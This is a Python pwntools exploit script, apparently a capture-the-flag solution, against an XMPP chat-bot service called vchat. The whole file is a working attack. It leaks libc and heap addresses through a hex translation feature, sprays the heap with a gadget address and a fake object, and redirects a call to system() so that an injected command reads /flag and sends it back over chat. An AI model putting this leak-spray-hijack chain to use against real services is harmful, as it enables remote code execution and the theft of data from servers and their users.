#!/usr/bin/env python2

from pwn import *
from vbot import VBot, VBotBase

def main():
    host = sys.argv[1]
    port = int(sys.argv[2])

    class GoodNameBot(VBotBase):
        def __init__(self, *args, **kwargs):
            VBotBase.__init__(self, *args, **kwargs)
            self.connect()
            self.process(block=False)

        def session_bind(self, e):
            log.info('bound to %s', self.boundjid.bare)
            if len(self.boundjid.bare) % 2 == 0:
                log.info('request another user')
                self.disconnect()
                self.connect()

    A = GoodNameBot()

    class MyVBot(VBot):
        def target_ready(self, e):
            VBot.target_ready(self, e)

            cmd = '/vbot $VCHAT_SERVER %s `cat /flag`;' % self.boundjid.bare
            cmd = '/vbot ooo.vchat %s `cat /flag`;' % 'admin' # test!
            prefix = 'O' * 0x20 + A.boundjid.bare + cmd
            # leak
            d = self.try_leak(0x800, prefix=prefix)[:0x20]
            libc_ptr = u64(d[:8])
            heap_ptr = u64(d[0x10:0x18])
            log.info('libc ptr = %#x', libc_ptr)
            log.info('heap ptr = %#x', heap_ptr)
            jid_addr = heap_ptr + 0x30
            cmd_addr = jid_addr + len(A.boundjid.bare)

            libc_base = libc_ptr - 0x3ec200
            # mov 0xa8(%rdi),%rcx; push %rcx; mov 0x68(%rdi),%rdi ret;
            my_magic = libc_base + 0x520c7
            system = libc_base + 0x4f440

            # spray
            # block = 'A' * 0x800
            block = p64(my_magic) * 0x100
            for _ in xrange(8):
                self.translate('2', block.encode('hex'), 'hex')

            obj_addr = heap_ptr + 0x4000
            log.info('check %#x is filled', obj_addr)

            # raw_input('attach')
            A.message_sync(A.make_message(self.target, 'bye'))

            block = [random.randint(0, 2 ** 64 - 1)] * (0x120 / 8)
            block[0] = obj_addr
            block[0x68 / 8] = cmd_addr
            block[0x90 / 8] = jid_addr
            block[0x98 / 8] = len(A.boundjid.bare)
            block[0xa8 / 8] = system
            payload = ''.join(map(p64, block))
            for _ in xrange(8):
                self.translate('x', payload.encode('hex'), 'hex')

            log.info('trigger')
            A.message_sync(A.make_message(self.target, 'ping', mtype='chat'))
            A.check_done()

        def try_leak(self, n, prefix=''):
            ret = self.translate('echo', prefix.ljust(n * 2, 'O'), 'hex')
            return ret

        def message(self, msg):
            body = msg.get('body')
            if body != 'hello':
                log.info('got flag: %s', body)
                self.check_done()

    B = MyVBot((host, port))
    B.connect()
    B.process(block=True)

    sys.exit(0)


if __name__ == '__main__':
    # logging.basicConfig(level=logging.DEBUG, format='%(levelname)-8s %(message)s')
    main()
